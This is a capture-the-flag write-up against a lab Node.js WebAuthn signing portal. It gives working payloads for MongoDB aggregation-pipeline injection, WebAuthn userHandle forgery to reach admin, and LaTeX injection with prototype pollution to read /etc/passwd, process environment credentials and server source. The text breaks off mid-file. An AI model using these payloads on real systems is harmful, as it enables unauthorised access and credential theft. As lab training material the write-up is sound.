# Odyssey

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.45.112

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/ghostlink_tcp.htb $ip
# 3000/tcp open  ppp




# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/ghostlink_tcp $ip
# 3000/tcp open     http         Node.js Express framework
# |_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/ghostlink_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>

**Let's modify the hosts file and discover the APP**

{% code overflow="wrap" %}
```bash
echo "$ip aegis.korvia.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Technology Stack**

* **Backend**: Node.js with Express framework
* **Frontend**: Likely a single-page app (SPA) given the modern UI
* **Authentication**: FIDO2/WebAuthn hardware authenticator support



**Key Observations**

* Requires an "operator handle" in format `surname.initial` (e.g., `smith.j`)
* Uses hardware authenticators (YubiKey, FIDO2 devices)
* This is a "Directorate 9" restricted system
{% endhint %}

<mark style="color:blue;">**Step 3**</mark>

**however its a modern app that may be difficult but always deep enumration may lead to something interesting**&#x20;

{% code overflow="wrap" %}
```bash
/api/v1/aegis-mds/search

"_id":"69f49023225fb3c680909240","aaguid":"566581a4-5a65-9f87-c652-52851474f127","vendor":"Yubico","description":"YubiKey 5C","protocolFamily":"fido2","schema":3,"authenticatorVersion":100,"upv"
```
{% endcode %}

{% hint style="info" %}
**Looking at this \_id its predictable and give me a probablity thats its a MangoDB Database because the way we write the entry ID and also the value if we compare two value :**

{% code overflow="wrap" %}
```bash
69f49023 225fb3c680  909240
69f49023 225fb3c680  909241
69f49023 225fb3c680  909242
69f49023 225fb3c680  909243

# its a timestamp + same random value + INCREMENT COUNT
# the JSON in the request is a nested JSON because we see a nested array of some object so it's a binary JSON that make a probability that we deal with MongoDB 
```
{% endcode %}
{% endhint %}

**and in the webauth.js we found interesting endpoint**&#x20;

{% code overflow="wrap" %}
```js
async function register(inviteToken) {
    var opts = await postJSON('/api/v1/auth/webauthn/register/begin', { invite_token: inviteToken });
    opts.challenge = b64uToBuf(opts.challenge);
    opts.user.id = b64uToBuf(opts.user.id);
    if (opts.excludeCredentials) {
      opts.excludeCredentials = opts.excludeCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
        

var resp = {
      id: cred.id,
      rawId: bufToB64u(cred.rawId),
      type: cred.type,
      response: {
        clientDataJSON: bufToB64u(cred.response.clientDataJSON),
        attestationObject: bufToB64u(cred.response.attestationObject),
      },
      clientExtensionResults: cred.getClientExtensionResults ? cred.getClientExtensionResults() : {},
    };
    return await postJSON('/api/v1/auth/webauthn/register/finish', resp);
  }


 async function authenticate() {
    var opts = await postJSON('/api/v1/auth/webauthn/auth/begin', {});
    opts.challenge = b64uToBuf(opts.challenge);
    if (opts.allowCredentials) {
      opts.allowCredentials = opts.allowCredentials.map(function (c) {
        return Object.assign({}, c, { id: b64uToBuf(c.id) });
      });
```
{% endcode %}

**Now to start our main idea is to find a way to steal the token i tried many nosql injection but it doesnt give me anything so we still search on the web app**

<mark style="color:blue;">**Step 4**</mark>&#x20;

[https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines](https://soroush.me/blog/mongodb-nosql-injection-with-aggregation-pipelines)

**I found this blog that its talking abount nosql injection with aggragations pipelines since the sites uses pipelines it cound be an attack vector**

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?q[$gt]=5&limit=1 

{"error":"InvalidQueryShape","detail":"Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.","trace_id":"mds-2a1e4d"}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline[$gt]=12&limit=1
# this give me 400 bad request so we may be need to update the request 
```
{% endcode %}

**I tried a multipe things and paylaod but i think am on a dead end or still need something so i need to search more**&#x20;

**i start fuzzing from scartch the /api/v1 because am sure its our entry point we need just to leak the token**&#x20;

{% code overflow="wrap" %}
```bash
feroxbuster --url http://aegis.korvia.htb:3000/api/v1/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt --force-recursion -t 50 

feroxbuster --url http://aegis.korvia.htb:3000/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -m GET,POST,PUT,DELETE,OPTIONS,HEAD --status-codes 200,301,302,400,500 --filter-size 28
# 400      GET       66l      184w     2543c http://aegis.korvia.htb:3000/onboard
```
{% endcode %}

**i get it after 3 hours of fuzzing LoL !!, this  endpoints looks interesting**&#x20;

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**so our testing will be nosql injection here with aggregation pipelines**

{% code overflow="wrap" %}
```bash
http://aegis.korvia.htb:3000/onboard/13213223
# No matching record in pending_invites  (token may have been redeemed, expired, or never issued)
```
{% endcode %}

**We uncovered the exact name of the database collection we need to attack &#x20;**<mark style="color:red;">**(pending\_invites)**</mark>

**I think this is what we miss in our NoSQL injection**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$lookup":{"from":"pending_invites","pipeline":[{"$match":{}}],"as":"invites"}},{"$project":{"invites":1,"_id":0}},{"$unwind":"$invites"},{"$replaceRoot":{"newRoot":"$invites"}}]&limit=1

{"error":"invalid or disallowed pipeline stage"}
```
{% endcode %}

**So i think we hit a defense mecanism now the $match is blocked we try other stages, so to build the best payload we need to have an idea if basic sanity injcetion pass**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$match":{"vendor":"Yubico"}}]&limit=1

and it pass it return Yubico
```
{% endcode %}

**i tried $unionWith and also its blocked**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$project":{"vendor":1}}]&limit=1 

it pass it reveal all vendors
```
{% endcode %}

**But we need to read the tokens from pending\_invites**

**i will test $facet that run multipe stage in parallel it may bypass the blacklisted ones**

{% code overflow="wrap" %}
```
http://aegis.korvia.htb:3000/api/v1/aegis-mds/search?pipeline=[{"$facet":{"tokens":[{"$unionWith":{"coll":"pending_invites"}}]}}]&limit=1

and boom it pass i have all tokens of all vendors
```
{% endcode %}

<mark style="color:blue;">**Step 5**</mark>

**Le'ts make things together**

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**when i check all data there is one token that get expired at 2126 all others already expired**&#x20;

{% code overflow="wrap" %}
```json
{"_id":"69f49023225fb3c680909274","operator_id":"op-2026-0042","role":"Operator","token":"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238","issued_by":"ao-mreyes","issued_at":"2026-04-15T08:00:00.000Z","expires_at":"2126-05-15T00:00:00.000Z","redeemed":false,"pipeline":"forge-recruitment","clearance_target":"Δ-3"}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**so the main idea is when we try to register from the browser it doesnt pass because its like you do a request outside the browser so using devtools we will try to create a virtual webauth like its coming from localhost , the idea is to perform a virtual web auth on chrome but we need to change some confis on chrome to make the site secure and trusted by chrome to get the Webauth catched on devtools**

1. `chrome://flags/#unsafely-treat-insecure-origin-as-secure`
2. search  Insecure origins treated as secure
3. [http://aegis.korvia.htb:3000](http://aegis.korvia.htb:3000) and enabled then relaunch&#x20;

<br>

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**it the same problem but we get much inforamtion from here so the solutions is to build a python or C script that do this we have an idea of have the key is build and all things** <br>

{% code overflow="wrap" %}
```html
PublicKeyCredentialCreationOptions
"rp": 
"id": "aegis.korvia.htb",
"name": "AEGIS — Sovereign Signing & Attestation Authority"
},
"user": 
"id": "b3AtMjAyNi0wMDQy",
"name": "op-2026-0042",
"displayName": "op-2026-0042"
},
"challenge": "0VDyTM-dskfX-Tq0iC2LkucaWtkDWApcZSnAhlts7_w",
"pubKeyCredParams": 
"type": "public-key",
"alg": -7
},
"type": "public-key",
"alg": -257
}
],
"timeout": 60000,
"authenticatorSelection": 
"residentKey"
: "required",
"userVerification"
: "preferred",
"requireResidentKey"
: true
},
"attestation": "none",
"extensions": 
"credProps": true
}
}
```
{% endcode %}

**so after deep searching on browser and understanding things i can setup i reverse proxy using to register and save a passkey on my browser then i will use it to authentificate**

{% code overflow="wrap" %}
```bash
wget https://github.com/FiloSottile/mkcert/releases/download/v1.4.4/mkcert-v1.4.4-linux-amd64
chmod +x mkcert-v1.4.4-linux-amd64
sudo mv mkcert-v1.4.4-linux-amd64 /usr/local/bin/mkcert
mkcert aegis.korvia.htb
```
{% endcode %}

{% code overflow="wrap" %}
```bash
# reverse proxy setup
sudo nano /etc/nginx/sites-available/aegis
server {
    listen 443 ssl;
    server_name aegis.korvia.htb;

    # Point to the exact paths where mkcert saved the files
    ssl_certificate /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb.pem;
    ssl_certificate_key /home/gb05/Desktop/CPTS_PREP/aegis.korvia.htb-key.pem;

    location / {
        proxy_pass http://10.129.45.250:3000;
        # Ensure the backend still sees the correct hostname
        proxy_set_header Host aegis.korvia.htb;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```
{% endcode %}

{% code overflow="wrap" %}
```bash
sudo ln -s /etc/nginx/sites-available/aegis /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```
{% endcode %}

**Then on /etc/hosts change the ip to 127.0.0.1**&#x20;

**Then reload the browser and it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000742.png" alt=""><figcaption></figcaption></figure>

**click Next -> Save -> create a password for him on Manager Password for google -> Done**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 000802.png" alt=""><figcaption></figcaption></figure>

**Then it will redirect to login page click login**&#x20;

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**after fuzzing another time and crawling the app i found in the audit this**&#x20;

| 2026-04-29 14:08 | admin | pruned 4 stale operator credentials (90d inactivity) |
| ---------------- | ----- | ---------------------------------------------------- |

{% hint style="info" %}
**The admin deleted the WebAuthn hardware key bindings for 4 specific**

**we have two attack vector we will test them both**&#x20;

* **The "Stale Account" Takeover (Account Hijacking)**
* **MongoDB Aggregation Pipeline Write**

**So from here we know first that there is an admin role so we can assign this role to our operator user**&#x20;
{% endhint %}

**so also when seeing the blog we can update the DATA, however it doesnt work because when the stages to update its blacklisted.**

**i spend time to understand the regiter logic and the login logic i found that when we login in this request /api/v1/auth/webauthn/auth/finish it contain an entry userHandle**&#x20;

{% code overflow="wrap" %}
```bash
"userHandle":"b3AtMjAyNi0wMDQy"
# if we decode it in base64 it give our current user op-2026-042
```
{% endcode %}

**so the idea if we can hijack this it can give us the role admin but the idea i start with is to add this entry when i register the passkey but when i finish and i try to register it give me this**&#x20;

{% code overflow="wrap" %}
```
Authentication failed: OperatorNotFound: No active operator with handle 'admin 
```
{% endcode %}

**Then i tried to jist change it on the on the login and it work because also in the webauth.js there is no validation for this so we can put anything , i encode in base64 admin and i put it**&#x20;

**then after in the login it work**

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-07-03 025831.png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 6**</mark>

**Now we should found a way to have a rev-shell,let's enumarete the app very well and do some hard fuzzing**

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

**I tried SSRF here in the URL i tried many paylaods but nothign pass all gives 404 so i think its not because doesnt exsit but its seems a firewall blocks our payload**

**i found this pending authorization**

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

**This is a code signing system for critical software (Windows kernel drivers, firmware). As an admin (Authorising Officer), however The "Notice Templates" system is a classic SSTI target. Templates are used to generate signing certificates/notices. If i can inject template code, i get Remote Code Execution.**

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

**The template engine uses `{{ }}` and `{% %}` syntax, which is characteristic of Nunjucks (common in Node.js/Express) or Jinja2 (Python). Since we know the backend is Express, it is almost certainly Nunjucks.**<br>

**so in the template body i inject `{{7*7}}`**

**i save it then i click rendre preview i receive this**&#x20;

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**i dont see any response but it can be blind because its executed in the backend from this i can understand how the process work**&#x20;

1. **Nunjucks evaluates** `{{ 7 * 7 }}` → becomes `49`
2. **Pandoc converts** the template to LaTeX
3. **LaTeX/PDFLaTeX creates** a PDF document
4. **The PDF is saved** to: `/var/lib/aegis-render/jobs/job-1783090909445-eab06cba/notice.final.pdf`
{% endhint %}

**However this is its just an hypothese we need to confirm it**&#x20;

{% code overflow="wrap" %}
```bash
\input{/etc/passwd} # LaTex Injection

) (/etc/passwd
! Missing $ inserted.
<inserted text> 
                $
l.17 _
      apt:x:42:65534::/nonexistent:/usr/sbin/nologin
      

Overfull \hbox (57.68275pt too wide) in paragraph at lines 1--15
[]\T1/lmr/m/n/10 root:x:0:0:root:/root:/bin/bash dae-mon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin
 []


Overfull \hbox (59.43445pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
 []


Overfull \hbox (138.23726pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
 []


Overfull \hbox (179.87813pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
 []


Overfull \hbox (24.7382pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
 []


Overfull \hbox (3.30363pt too wide) in paragraph at lines 1--15
\T1/lmr/m/n/10 list:x:38:38:Mailing List Man-ager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin $[]\OML/lmm/m/it/10 pt \OT1/lmr/m/n/10 :
 []
```
{% endcode %}

**I receive a huge output containg some errors, its a huge win the intersting part is this we confirmed an LFI, so we need to chain all this to have more impact**&#x20;

**i inject advanced command injection via the template body and the errors i receive make me have a clear idea of what we dealing**&#x20;

{% hint style="info" %}
1. **`\write18` is disabled: The line `runsystem(id > /tmp/rce_out.txt)...disabled.` confirms that LaTeX shell escape is turned off.I cannot execute commands directly via LaTeX.**
2. **Markdown is mangling your backslashes: The error `\catcode\texttt{\textbackslash{}\_=12...}` shows that the web interface (likely using Pandoc/Markdown) is converting your `\catcode\_=12` into a code block `\texttt{...}`. This breaks the LaTeX syntax.**
{% endhint %}

**i tried ASCII Catcodes + LFI and it work i can read environment varilables**&#x20;

{% code overflow="wrap" %}
```bash
\begingroup \catcode 95=12 \catcode 38=12 \catcode 35=12 \catcode 37=12 \catcode 36=12 \input{/proc/self/environ} \endgroup
```
{% endcode %}

{% code overflow="wrap" %}
```
DB_USER=aegis_audit_publisher
DB_PASS=Rxd!Qw6n8sP..2bJ@Wpx-2026
DB_HOST=172.16.0.11
DB_DB=aegis_audit
DB_PORT=1433
Worker Script Path: /home/webadmin/aegis/lib/render_worker.js
User Context: The process runs as aegis-render but was started via sudo by webadmin (UID 1000)
```
{% endcode %}

**I tried many payloads but :**

{% hint style="info" %}
**The Ghostscript sandbox (`-dSAFER`) and LaTeX's `-no-shell-escape` flag are blocking direct command execution. This is a common hardening measure (Having this infos from reading /proc/self/cmdline)**
{% endhint %}

**i try maniulate this parameters**

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Making AllowRawBlocks to True but i receive that this its just affecting Pandoc (allowing raw LaTeX blocks to pass through), am sure am playing around to chain all things to found the real and functional attack path so we need just to be more overlooking all things together**
{% endhint %}

{% hint style="warning" %}
#### The Rendering Pipeline Explained

When we click Render Preview :

**Stage 1: Nunjucks (Node.js Template Engine)**

**Stage 2: Pandoc (Document Converter)**

**Stage 3: pdflatex (LaTeX Compiler)**

**Stage 4 & 5: dvips & Ghostscript (PostScript to PDF)**
{% endhint %}

**but we hit a hard block, like the app relies on a strict configuration  object to decide whether to enable dangerous features**

**If we can pollute that object's prototype, we can change the application's behavior without having direct access to the code**

**looking at devtools network the response when we click render we confirm what we said**&#x20;

{% code overflow="wrap" %}
```js
{
    "ok": true,
    "finalStage": "gs",
    "artifactPath": "/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf",
    "durationMs": 365,
    "stages": [
        {
            "stage": "nunjucks",
            "code": 0,
            "durationMs": 4,
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "pandoc",
            "code": 0,
            "durationMs": 14,
            "cmd": "/usr/bin/pandoc --from markdown-raw_attribute --to latex --standalone --template /var/lib/aegis-render/jobs/job-1783095028914-54814c12/authcert.tex -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.md",
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "pdflatex",
            "code": 0,
            "durationMs": 141,
            "cmd": "/usr/bin/pdflatex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
            "stderr": "",
            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=pdflatex)\nentering extended mode\n"
        },
        {
            "stage": "latex",
            "code": 0,
            "durationMs": 122,
            "cmd": "/usr/bin/latex -interaction=batchmode -no-shell-escape -output-directory /var/lib/aegis-render/jobs/job-1783095028914-54814c12 /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.tex",
            "stderr": "",
            "stdout": "This is pdfTeX, Version 3.141592653-2.6-1.40.28 (TeX Live 2025/Debian) (preloaded format=latex)\nentering extended mode\n"
        },
        {
            "stage": "dvips",
            "code": 0,
            "durationMs": 21,
            "cmd": "/usr/bin/dvips -q -o /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.dvi",
            "stderr": "",
            "stdout": ""
        },
        {
            "stage": "gs",
            "code": 0,
            "durationMs": 61,
            "cmd": "/usr/bin/gs -dBATCH -dNOPAUSE -dSAFER -dQUIET -sDEVICE=pdfwrite -sOutputFile=/var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.final.pdf /var/lib/aegis-render/jobs/job-1783095028914-54814c12/notice.ps",
            "stderr": "",
            "stdout": ""
        }
    ]
}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

**if we can control Pandoc mechanism we can successfully leak all data because using latex injection  because the problem is when we read arbitary data the pandoc crash we receive pieces from file but it can't lead us to nothing or may we should be more polluating the prameters**

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**`! LaTeX Error: Can be used only in preamble.` - `\usepackage{verbatim}` can only be used before `\begin{document}`, but our template body is injected into the document body, so it failed, and also we cant use external package**
{% endhint %}

**current `body` is just raw TeX commands, but Pandoc sees them as text and escapes them.**

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

**This also doesnt work**&#x20;

**finally after using this blog** [**https://rxiv-maker.henriqueslab.org/advanced/latex-injection/**](https://rxiv-maker.henriqueslab.org/advanced/latex-injection/)

**i can have multipe method to inject, in fact we succesffuly inject before but we get the data crashed sometimes we know the webroot but when we reed to red the server.js i couldn't**

<mark style="color:red;">**I have one question in mind why the /etc/passwd i read it using /input but a complex code i cant ?**</mark>

**After deep searching i found that**&#x20;

{% hint style="info" %}
When we  use `\input{server.js}`, TeX doesn't just read the file - it **typesets** it. This means:

* Every character is interpreted through the **catcode table** (so `_` becomes subscript, `$` becomes math mode, etc.)
* The **font engine** switches fonts based on the content (that's why you see `\OML/lmm/m/it/10` prefixes)
* The **paragraph builder** breaks long lines and creates overfull hbox warnings
* Special characters like `/` get converted to `=` due to font encoding
{% endhint %}

{% hint style="info" %}
The `\read` primitive is a **low-level file I/O operation** that:

* Reads raw bytes from the file
* Stores them directly into a macro variable **without any interpretation**
* No catcode conversion
* No font switching
* No paragraph building
* The data remains a pure string
{% endhint %}

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

**The `\typeout` command is being suppressed because `pdflatex` is running with `-interaction=batchmode`. We need a different approach to exfiltrate the data.**\
**so we use the errmessage**

{% code overflow="wrap" %}
```
{
  "body": "\\newread\\file \\openin\\file=/home/webadmin/aegis/server.js \\loop\\unless\\ifeof\\file \\read\\file to\\myline \\errmessage{\\myline} \\repeat \\closein\\file",
  "overrides": "{\"__proto__\":{\"allowRawBlocks\":true},\"audience\":\"internal\",\"ceremony_witness\":\"s.vrana\"}"
}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```javascript
const path = require('path');
const express = require('express');
const session = require('express-session');
const nunjucks = require('nunjucks');
const mongo = require('./db/mongo');
const sql = require('./db/sql');
const MssqlSessionStore = require('./lib/sql_session_store');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || '0.0.0.0';

app.set('trust proxy', 1);

const env = nunjucks.configure(path.join(__dirname, 'views'), { 
    autoescape: true, 
    express: app, 
    noCache: true 
});

env.addGlobal('CLASSIFICATION', 'TOP SECRET // KORVIA EYES ONLY // D9-RESTRICTED');
env.addGlobal('SYSTEM', { 
    name: 'AEGIS', 
    longName: 'Sovereign Signing & Attestation Authority', 
    agency: 'Directorate 9', 
    build: '7.4.2-prod', 
    node: 'aegis-prod-01' 
});

const AEGIS_HOST = "aegis.korvia.htb";

app.use((req, res, next) => { 
    const host = (req.headers.host || "").replace(/:.*/, ""); 
    if (host !== AEGIS_HOST) { 
        return res.redirect(301, "http://" + AEGIS_HOST + ":" + PORT + req.originalUrl); 
    } 
    next(); 
});

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(session({ 
    name: 'aegis.sid', 
    secret: process.env.AEGIS_SESSION_SECRET || 'aegis-prod-fixed-secret-d9-restricted-do-not-rotate', 
    store: new MssqlSessionStore({ ttlMs: 30 * 24 * 60 * 60 * 1000 }), 
    resave: false, 
    saveUninitialized: false, 
    rolling: true, 
    cookie: { 
        httpOnly: true, 
        sameSite: 'lax', 
        maxAge: 30 * 24 * 60 * 60 * 1000 
    } 
}));

app.use((req, res, next) => { 
    res.locals.path = req.path; 
    if (req.session && req.session.userId) { 
        res.locals.user = { 
            id: req.session.userId, 
            handle: req.session.userHandle, 
            role: req.session.userRole 
        }; 
    } else { 
        res.locals.user = null; 
    } 
    next(); 
});

app.use('/', require('./routes/mds'));
app.use('/', require('./routes/mds_diag'));
app.use('/', require('./routes/onboard'));
app.use('/', require('./routes/webauthn'));
app.use('/', require('./routes/templates'));
app.use('/', require('./routes/index'));

app.use((req, res) => { 
    res.status(404).render('error.njk', { 
        code: 404, 
        title: 'Resource Not Located', 
        detail: 'The requested object does not exist or your clearance is insufficient.' 
    }); 
});

async function waitForDeps() {
    // Mongo: hard requirement, retry forever in 5s steps (mongod is local, should come up fast)
    for (;;) {
        try {
            await mongo.init();
            console.log('MDS shard connected.');
            break;
        } catch (e) {
            console.error('MDS shard unreachable, retrying in 5s:', e.message);
            await new Promise(r => setTimeout(r, 5000));
        }
    }
    
    // SQL: retry forever in 5s steps until pool is ready
    for (;;) {
        try {
            await sql.init();
            console.log('AEGIS SQL connected.');
            break;
        } catch (e) {
            console.error('AEGIS SQL unreachable, retrying in 5s:', e.message);
            await new Promise(r => setTimeout(r, 5000));
        }
    }
}

(async () => {
    await waitForDeps();
    app.listen(PORT, HOST, () => {
        console.log(`AEGIS listening on http://${HOST}:${PORT}`);
    });
})();
```
{% endcode %}

**We have the secret session and we have two toher js files that may be we did not use them yet thee mdg and the mdg\_diag let's discover them**&#x20;

**mdg.js**

{% code overflow="wrap" %}
```java
const express = require('express');
const router = express.Router();
const { getDb } = require('../db/mongo');

const ALLOWED_STAGES = ['$match', '$project', '$sort', '$limit', '$facet'];

function makeTraceId() {
  const hex = '0123456789abcdef';
  let s = 'mds-';
  for (let i = 0; i < 6; i++) s += hex[Math.floor(Math.random() * 16)];
  return s;
}

function isOperatorObject(v) {
  if (v === null || typeof v !== 'object' || Array.isArray(v)) return false;
  for (const k of Object.keys(v)) {
    if (typeof k === 'string' && k.startsWith('$')) return true;
  }
  return false;
}

router.get('/api/v1/aegis-mds/search', async (req, res) => {
  const trace = makeTraceId();
  let coll;
  try {
    coll = getDb().collection('mds_entries');
  } catch (e) {
    return res.status(503).json({
      error: 'ServiceUnavailable',
      detail: 'MDS shard not initialised',
      trace_id: trace
    });
  }

  if (Object.prototype.hasOwnProperty.call(req.query, 'pipeline')) {
    const raw = req.query.pipeline;
    let pipeline;
    try {
      pipeline = JSON.parse(raw);
    } catch (e) {
      return res.status(400).end();
    }
    if (!Array.isArray(pipeline)) {
      return res.status(400).end();
    }

    for (const stage of pipeline) {
      if (!stage || typeof stage !== 'object' || Array.isArray(stage)) {
        return res.status(400).end();
      }
      const keys = Object.keys(stage);
      if (keys.length !== 1) {
        return res.status(400).end();
      }
      const stageName = keys[0];
      if (!ALLOWED_STAGES.includes(stageName)) {
        return res.status(400).json({ error: 'invalid or disallowed pipeline stage' });
      }
    }

    try {
      const cursor = coll.aggregate(pipeline, {
        allowDiskUse: false,
        maxTimeMS: 4000
      });
      const docs = await cursor.toArray();
      return res.json(docs);
    } catch (e) {
      return res.status(500).json({
        error: e.name || 'MongoServerError',
        detail: e.message || String(e),
        ns: e.ns || `${getDb().databaseName}.mds_entries`,
        trace_id: trace,
      });
    }
  }

  if (Object.prototype.hasOwnProperty.call(req.query, 'q')) {
    const q = req.query.q;
    if (isOperatorObject(q)) {
      return res.status(400).json({
        error: 'InvalidQueryShape',
        detail: "Operator-form queries not accepted on 'q'. Use the 'pipeline' parameter for advanced queries.",
        trace_id: trace,
      });
    }
    const text = typeof q === 'string' ? q.trim() : '';
    const limit = Math.min(parseInt(req.query.limit, 10) || 25, 100);
    let filter = {};
    if (text) {
      const safe = text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const rx = new RegExp(safe, 'i');
      filter = {
        $or: [
          { description: rx },
          { vendor: rx },
          { aaguid: rx }
        ]
      };
    }
    try {
      const docs = await coll.find(filter).limit(limit).toArray();
      return res.json(docs);
    } catch (e) {
      return res.status(500).json({
        error: 'MongoServerError',
        detail: e.message,
        trace_id: trace
      });
    }
  }

  try {
    const docs = await coll.find({}).limit(25).toArray();
    return res.json(docs);
  } catch (e) {
    return res.status(500).json({
      error: 'MongoServerError',
      detail: e.message,
      trace_id: trace
    });
  }
});

router.get('/api/v1/aegis-mds/entry/:id', async (req, res) => {
  const trace = makeTraceId();
  const id = String(req.params.id || '');
  try {
    const doc = await getDb().collection('mds_entries').findOne({ aaguid: id });
    if (!doc) return res.status(404).json({
      error: 'NotFound',
      detail: 'No MDS entry with that AAGUID.',
      trace_id: trace
    });
    return res.json(doc);
  } catch (e) {
    return res.status(500).json({
      error: 'MongoServerError',
      detail: e.message,
      trace_id: trace
    });
  }
});

module.exports = router;
```
{% endcode %}

**And we know the allowed stages that we discover earlier and our hypotheses was true**&#x20;

**./routes/template.js**

{% code overflow="wrap" %}
```java
// AEGIS admin templates routes — list, edit, save, render.
//
// Render flow: web hands a job spec to the renderer worker via sudo (the
// worker drops to the `aegis-render` principal so any rendering bug lands
// in an isolated context — see ICR-2024-0142). The worker writes
// `result.json`; we summarise it into the render_diagnostics table and
// return the latest status to the editor's diagnostics panel.

const express = require('express');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const sql = require('../db/sql');

const router = express.Router();

const RENDER_WORKER = '/home/webadmin/aegis/lib/render_worker.js';
const RENDER_USER = 'aegis-render';
const JOB_ROOT = '/var/lib/aegis-render/jobs';
const RENDER_TIMEOUT_MS = 25000;

function requireAdmin(req, res, next) {
  if (!req.session || !req.session.userId) return res.redirect('/login');
  if (req.session.userRole !== 'Administrator') {
    return res.status(404).render('error.njk', {
      code: 404,
      title: 'Resource Not Located',
      detail: 'The requested object does not exist or your clearance is insufficient.',
    });
  }
  next();
}

async function listTemplates() {
  const p = sql.getPool();
  const r = await p.request().query(
    'SELECT id, name, scope, owner, version, status, role_tier, modified FROM dbo.templates ORDER BY modified DESC'
  );
